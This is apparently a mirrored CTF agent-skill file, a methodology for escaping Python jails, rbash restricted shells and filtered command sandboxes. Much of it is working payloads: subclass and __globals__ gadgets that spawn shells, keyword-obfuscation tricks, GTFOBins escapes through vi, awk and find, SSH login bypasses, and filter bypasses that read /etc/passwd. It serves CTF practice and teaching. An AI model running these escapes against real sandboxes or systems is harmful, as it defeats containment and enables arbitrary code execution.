# Misc Jail & Sandbox Escapes

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/stego-osint-misc/misc-jail-escapes.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/stego-osint-misc/misc-jail-escapes.md)

---

---
name: misc-jail-escapes
category: stego-osint-misc
triggers: ["python jail", "pyjail", "sandbox escape", "bash restricted", "rbash", "restricted shell", "filter bypass", "eval", "exec", "blacklist bypass", "command injection", "escape the jail", "builtins", "subclasses", "misc recon"]
tools: ["python3", "bash", "ssh", "vi", "less", "awk", "find", "env", "gtfobins"]
priority: high
description: Decision-tree methodology for escaping Python jails, restricted shells (rbash), and filtered command sandboxes in misc CTF challenges.
---
# Misc Jail & Sandbox Escapes

## Trigger context
Use for "misc" challenges that drop you into a constrained execution environment: a Python `eval`/`exec` jail that blacklists keywords, a restricted shell (rbash/rksh) that blocks paths and metacharacters, or a command sandbox that filters characters. Goal is almost always to read a `flag` file or spawn `/bin/sh`. Signals: a prompt that echoes your input into `eval()`, "you are in a restricted shell", banned-word lists, or `cd`/`/` being rejected.

## Objective
Break out of the sandbox to execute arbitrary code or read the flag, while respecting whatever character/keyword filter is in place. Reach `os.system`/`subprocess` in Python, or an unrestricted `/bin/bash` from rbash, or the flag file directly.

## Methodology (decision tree)
1. Recon the jail FIRST - do not guess payloads blind:
   - Python: leak the source or probe what is allowed. Check `dir()`, `globals()`, `__builtins__`, and which names/chars are blacklisted. Is `__import__` gone? Is `.` or `_` filtered? Is input length capped?
   - Shell: run `help`, `echo $PATH`, `echo $SHELL`, `compgen -c` (list callable commands), and test whether `/`, `;`, `|`, `cd` are blocked.
2. Python jail branch:
   - If `os`/`import` allowed -> just `import os; os.system('sh')` or `__import__('os').system('cat flag')`.
   - If builtins/imports stripped -> reach `os` via the object graph: `().__class__.__base__.__subclasses__()` -> find `os._wrap_close`/`subprocess.Popen`/`warnings.catch_warnings` -> use its `__globals__` or `__builtins__` -> exec.
   - If keywords like `import`, `eval`, `os` are string-blacklisted -> build them from `getattr`, string concatenation, `chr()`, hex/unicode escapes, or f-string tricks so the literal never appears.
   - If dunders (`__`) are filtered -> use `getattr()` with computed names, or index into `().__class__` via alternative access; try `breakpoint()` (opens pdb -> shell) or format-string `str.format` gadget.
   - Length-limited input -> use `exec(input())` to stage a longer second payload, or short generator/comprehension gadgets.
3. Restricted shell (rbash) branch:
   - Look for any interpreter or pager you can invoke: `vi`/`vim`, `less`/`more`/`man`, `python`/`perl`/`awk`/`find`/`ftp`/`gdb`/`ed` - each has a documented shell-escape (GTFOBins).
   - If PATH is limited, set variables not yet locked, or use full-path binaries in a writable dir.
   - If you connect over SSH, request a raw shell at login: `ssh user@host -t "bash --noprofile"` or `ssh user@host -t "/bin/sh"`.
   - After escaping to a normal shell, immediately `export PATH=/usr/bin:/bin` and `export SHELL=/bin/bash` to regain full functionality.
4. Command/filter sandbox branch (e.g. blocked spaces, blocked `flag`, blocked slashes):
   - Space bypass: `${IFS}`, `<`, `{cat,flag}`, `$'\t'`.
   - Keyword bypass: quoting/globbing `c''at fl?g`, `/bin/ca\t f*`, variable indirection `a=fl;b=ag;cat $a$b`.
   - Slash/path bypass: `${PATH:0:1}` yields `/`; brace/glob expansion for filenames.

## Commands & payloads
```python
# --- Python jail recon ---
print(dir())                 # names in scope
print(__builtins__)          # is it a dict/module or stripped?
print(().__class__.__base__.__subclasses__())   # enumerate reachable classes

# --- Straightforward (imports allowed) ---
__import__('os').system('cat flag')
breakpoint()                 # if not filtered -> pdb prompt -> `import os; os.system('sh')`

# --- Subclasses gadget (builtins stripped) ---
# Find an index i whose class carries a useful __globals__/__builtins__:
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings']
# then, via that class instance:
().__class__.__base__.__subclasses__()[i]()._module.__builtins__['__import__']('os').system('sh')
# os._wrap_close route:
[c for c in ().__class__.__base__.__subclasses__() if 'wrap_close' in c.__name__][0].__init__.__globals__['system']('sh')

# --- Keyword blacklist: build banned strings without writing them ---
getattr(__import__('o'+'s'), 'sys'+'tem')('cat flag')     # 'os','system' never appear literally
().__class__.__base__.__subclasses__()[i].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()]  # 'system' from bytes

# --- Format-string gadget (only .format available) ---
"{0.__class__.__base__.__subclasses__}".format(())        # pivot into the object graph via str.format
```

```bash
# --- rbash recon ---
echo $PATH; echo $SHELL; compgen -c        # what can you call?
help                                        # builtin list

# --- GTFOBins-style rbash escapes ---
vi -c ':!/bin/sh' /dev/null                 # from vi/vim
awk 'BEGIN{system("/bin/sh")}'              # awk
find . -exec /bin/sh \; -quit               # find
python3 -c 'import os;os.system("/bin/bash")'
perl -e 'exec "/bin/sh";'
# less/man -> type `!/bin/sh` at the pager prompt

# --- SSH bypass at login ---
ssh user@host -t "bash --noprofile --norc"
ssh user@host -t "/bin/sh"

# --- After escape: restore a usable environment ---
export PATH=/usr/bin:/usr/local/bin:/bin
export SHELL=/bin/bash; exec /bin/bash

# --- Filter/character bypass (blocked space / keyword / slash) ---
cat${IFS}flag              # space -> ${IFS}
{cat,flag}                 # brace expansion, no space
c''at fl?g                 # quote+glob to dodge keyword filter
a=fl;b=ag;cat $a$b         # variable concat
X=$(echo /);cat ${X}etc/passwd   # rebuild '/' ; or ${PATH:0:1}
```

## Branching logic
- `import`/`os` NOT blacklisted -> one-liner `__import__('os').system(...)`; stop there.
- Builtins stripped but object access allowed -> subclasses/`__globals__` gadget.
- The literal words are filtered but the mechanism is not -> obfuscate the strings (concat/chr/bytes/getattr).
- `__` or `.` filtered -> `getattr`, `str.format` gadget, or `breakpoint()`.
- rbash + any interpreter/pager on PATH -> GTFOBins escape for that binary.
- rbash over SSH -> request an alternate shell at login before you even land in rbash.
- Shell filters characters, not commands -> IFS/glob/quote/variable tricks.

## Common pitfalls
- Firing payloads before recon: you waste attempts and may trip a strike-limit. Enumerate the filter first.
- Hardcoding a subclasses index - the index shifts between Python versions and imports. Always search by class name, not a fixed number.
- Assuming `__builtins__` is a module; inside restricted `exec` it is often a dict, changing how you index it.
- Forgetting that after rbash escape, PATH/SHELL are still crippled - export them or commands "vanish".
- Blocked space but you keep typing spaces - switch to `${IFS}`/`{a,b}` immediately.
- Overlooking `breakpoint()`/`help()`/`license()`/pdb as trivial escape hatches when not filtered.
- Leaving `_`/`.` obfuscation half-done so a banned substring still appears once - scan your payload for every literal ban.

## Proof / verification
- Demonstrate code execution concretely: `id`, `cat flag`, or spawning `sh` and reading the flag file - not just a payload that "should" work.
- Note the Python version if you used a subclasses gadget, since the working index/class depends on it.
- Show the exact filtered characters/words you bypassed so the escape is reproducible.

## Cross-references
- Escaped shell now needs to escalate to root / read a protected flag -> Linux privesc methodology.
- Output is encoded before you can read it -> crypto & encoding methodology.
- The jail is delivered over a network service (nc/socket) -> pwn/interaction tooling (pwntools).
- Sandbox around a media/file artifact -> steganography.md / forensics.

## Credible sources
- HackTricks - Bypass Python sandboxes: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html
- HackTricks - Escaping from limited/restricted bash: https://hacktricks.wiki/en/linux-hardening/privilege-escalation/escaping-from-limited-bash.html
- GTFOBins (shell escapes by binary): https://gtfobins.github.io/
- PayloadsAllTheThings - Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
- pyjail cheatsheet (Shirajuki): https://shirajuki.js.org/blog/pyjail-cheatsheet/
- CTF101 - The Basics (misc): https://ctf101.org/
